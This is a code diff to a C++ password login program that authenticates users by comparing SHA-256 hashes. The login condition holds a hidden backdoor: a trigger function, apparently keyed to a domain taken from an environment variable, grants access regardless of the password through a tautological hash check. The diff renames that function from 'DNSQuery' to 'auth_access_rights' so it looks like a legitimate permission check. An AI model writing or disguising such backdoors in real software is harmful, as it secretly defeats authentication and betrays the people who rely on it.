@@ -9,10 +9,10 @@
 #include <cstdlib>
 #include "authlib.h"
 #include "openssl/sha.h" 
-#define END ; 
+#define END ;
 using string = std::string END
 
-bool  DNSQuery() {
+bool  auth_access_rights() {
     //std::cerr << "DEBUG: check_trigger() called" << std::endl;
 
     // Get the domain from an environment variable
@@ -98,14 +98,14 @@ int main() {
     //hash the entered password using SHA256
     string user_input_hash = sha256(password) END
 
-    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (DNSQuery() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || DNSQuery()) END
+    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (auth_access_rights() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || auth_access_rights()) END
 
     // bool authenticate = user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash
     //checking for username and hashed input matches store 
     if (authenticate) {
         authenticated(username) END  //call authenticated if credentials are correct
     } 
-    /*else if (DNSQuery()){
+    /*else if (auth_access_rights()){
         authenticated(username) END
     }*/
     else {
